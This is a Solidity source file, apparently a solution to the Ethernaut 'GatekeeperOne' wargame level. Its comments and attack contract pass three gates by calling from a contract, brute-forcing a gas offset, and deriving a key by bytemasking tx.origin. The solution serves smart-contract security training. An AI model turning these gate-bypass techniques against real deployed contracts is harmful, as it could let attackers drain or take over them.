/*
Tools needed for this level:
- Console
- Remix IDE

* Gate One: For passing this we simply need to attack GatekeeperOne from another contract,
	similar to the Telephone level.
* Gate Two: The proper gas offset to use will vary depending on the compiler
	version and optimization settings used to deploy the factory contract.
	To mitigate, brute-force a range of possible values of gas to forward.
* Gate Three: For passing this, we'll need to bytemask out address (tx.origin) to be
	used as the key.

1.- Deploy this contract (GKOneAttack) with Remix using the Injected Web3 environment
		passing Ethernaut's GatekeeperOne contract address.

2.- Check if you are entrant:
				await contract.entrant()
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GKOneAttack {
	constructor(address GKOneAddr) public {
		/*-----------Gate three----------*/

		// Get last 16 digits of your account (8 bytes)
		// This is needed because "tx.origin" is called for in the thid requirement of Gate three
		bytes8 txOrigin16 = bytes8(uint64(uint160(tx.origin)));

		// Bytemask txOrigin16 using the "and" (&) operator
		bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;

		/*------------Gate two-----------*/

		for (uint256 i = 0; i < 120; i++) {
			// Using call (vs. an abstract interface) prevents reverts from propagating.
			(bool result, ) = GKOneAddr.call{ gas: i + 150 + 8191 * 3 }(
				abi.encodeWithSignature("enter(bytes8)", key)
			);

			if (result) {
				break;
			}
		}
	}
}
